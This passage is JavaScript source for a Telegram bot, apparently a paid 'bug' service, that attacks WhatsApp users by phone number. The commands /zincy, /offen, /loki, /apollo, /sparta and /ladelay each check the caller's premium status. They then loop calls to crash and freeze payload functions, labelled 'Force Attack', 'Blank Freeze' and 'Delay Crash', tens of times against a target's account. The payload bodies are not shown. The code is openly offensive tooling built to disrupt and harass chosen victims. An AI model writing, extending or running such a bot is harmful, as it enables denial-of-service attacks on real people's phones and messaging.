            `;
            newButtons = [
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "ownermenu") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
───────────────────────
<blockquote>◌═──▻ ⦗ 𝖢𝗈𝗇𝗍𝗋𝗈𝗅 - 𝖬𝖾𝗇𝗎 ⦘ ◅──═◌ </blockquote>
 ▪️ /reloadcore - Update Bot
 ▪ /addprem - Add premium user
 ▪ /delprem - delete premium users
 ▪ /addceo - add ceo user
 ▪ /delceo - delete ceo users
 ▪ /listprem - list user premium
 ▪ /connect 628xx - addsender number
 ▪ /resetsession - Hapus semua sesi WhatsApp
            `;
            newButtons = [
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "thanksto") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
───────────────────────
<blockquote>◌═──▻ ⦗ 𝖳𝗁𝖺𝗇𝗄𝗌 - 𝖳𝗈 ⦘ ◅──═◌ </blockquote>
-𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 
            `;
            newButtons = [
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "mainmenu") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
───────────────────────
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖴𝗌𝖾𝗋 ◅──═◌ </blockquote>
⎋ 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
⎋ 𝖲𝗍𝖺𝗍𝗎𝗌 : ${isUserPremium ? "✅ Premium" : "❌ Regular"}
            `;
            newButtons = [
                [
                    { text: "𝖵ΖΘ - 𝖹Λ𝖯", callback_data: "bugshow" }, 
                    { text: "コントロール ", callback_data: "ownermenu" }
                ], 
                [
                    { text: "チーム", callback_data: "thanksto" }
                ], 
            ];
        } else {
            return bot.answerCallbackQuery(callbackQuery.id, { text: "Menu tidak dikenal", show_alert: false });
        }

        await bot.editMessageMedia({
            type: "video",
            media: randomVideo,
            caption: newCaption,
            parse_mode: "HTML"
        }, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: newButtons }
        });

        bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        console.error("Gagal edit media:", err);
        bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
    }
});

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
/// --- ( Case Bug ) --- \\\
bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /zincy 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force Attack
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force Attack
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 20; i++) {
            await sockFcInvis(sock, target);
            await sleep(500);
            await sockFcInvis(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Force`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force Attack
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/offen(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /offen [nomor]\nContoh: /offen 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /offen 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 20; i++) {
            await sockFcInvis(sock, target);
            await sleep(500);
            await sockFcInvis(sock, target);
            await sleep(500);
            await sockCarouselV1(sock, target);
            await sleep(500);
            await sockCarouselV1(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Force`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/loki(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /loki [nomor]\nContoh: /loki 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /loki 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Andro
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Andro
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 20; i++) {
            await BlankXFrezeeInfinity(sock, target);
            await sleep(500);
            await BlankXFrezeeInfinity(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Blank Andro`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Andro
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/apollo(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /apollo [nomor]\nContoh: /apollo 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /apollo 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 40; i++) {
            await LocationSilent(sock, target);
            await sleep(500);
            await LocationSilent(sock, target);
            await sleep(500);
            await BlankXFrezeeInfinity(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Blank Freeze`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/sparta(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /sparta [nomor]\nContoh: /sparta 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /sparta 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Soft Delay
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Soft Delay
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 25; i++) {
            await TheKingS9(sock, target);
            await sleep(500);
            await TheKingS9(sock, target);
            await sleep(500);
            await TheKingS9(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Soft Delay`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Soft Delay
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/ladelay(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /ladelay [nomor]\nContoh: /ladelay 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /ladelay 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Crash
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Crash
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
